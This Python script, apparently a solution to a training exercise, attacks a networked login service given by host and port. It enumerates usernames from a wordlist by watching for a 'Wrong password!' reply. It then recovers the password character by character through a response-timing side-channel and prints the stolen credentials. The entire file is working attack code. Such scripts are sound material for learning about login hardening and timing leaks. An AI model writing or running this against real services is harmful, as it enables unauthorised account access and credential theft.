import socket
import sys
import json
from string import ascii_letters, digits
from datetime import datetime, timedelta

WRONG_USER = {"result": "Wrong login!"}
WRONG_PASS = {"result": "Wrong password!"}
EXCEPTION = {"result": "Exception happened during login"}
SUCCESS = {"result": "Connection success!"}


class FarTry5:
    combo_string = ascii_letters + digits
    login_user_list = []
    login_pass_dict = {"login": "", "password": ""}
    _timedelta = int(str(timedelta(seconds=0.1)).split('.')[-1])
    difference = 0

    def __init__(self):
        self.ip_address = sys.argv[1]
        self.port = int(sys.argv[2])
        self.login_pass_dict = {}
        self.json_response = WRONG_USER
        self.login_pass = None
        self.sock = socket.socket()

    def run(self):
        self.sock.connect((self.ip_address, self.port))
        self.get_login_user()
        self.get_password()
        if self.json_response == SUCCESS:
            print(json.dumps(self.login_pass_dict))
        self.sock.close()

    def get_login_user(self):
        with open("hacking/logins.txt", "r") as file:
            for login in file:
                self.login_user_list.append(login.strip().replace('\n', ''))

        for user in self.login_user_list:
            if self.json_response == WRONG_USER:
                self.login_pass_dict = {"login": user, "password": ""}
                self.sock.send(json.dumps(
                    self.login_pass_dict).encode())
                self.json_response = json.loads(
                    self.sock.recv(1024).decode())
                if self.json_response == WRONG_PASS:
                    break
            elif self.json_response == WRONG_PASS:
                break

    def get_password(self):
        self.difference = 0
        pass_current = ''
        while not self.json_response == SUCCESS:
            for i in self.combo_string:
                current_try = pass_current + i
                if self.json_response == WRONG_PASS:
                    if len(self.login_pass_dict["password"]) == 0:
                        self.login_pass_dict["password"] = i
                    else:
                        self.login_pass_dict["password"] = current_try
                        self.request()

                    if self.difference >= self._timedelta:
                        pass_current = pass_current + i
                elif self.difference >= self._timedelta:
                    self.login_pass_dict["password"] = current_try
                    self.request()

    def request(self):
        start = datetime.now()
        self.sock.send(json.dumps(self.login_pass_dict).encode())
        self.json_response = json.loads(self.sock.recv(1024).decode())
        finish = datetime.now()
        self.difference = str(finish - start)
        if '.' not in self.difference:
            self.difference = 0
        else:
            self.difference = self.difference.split('.')
            self.difference = int(self.difference[-1])


FarTry5().run()
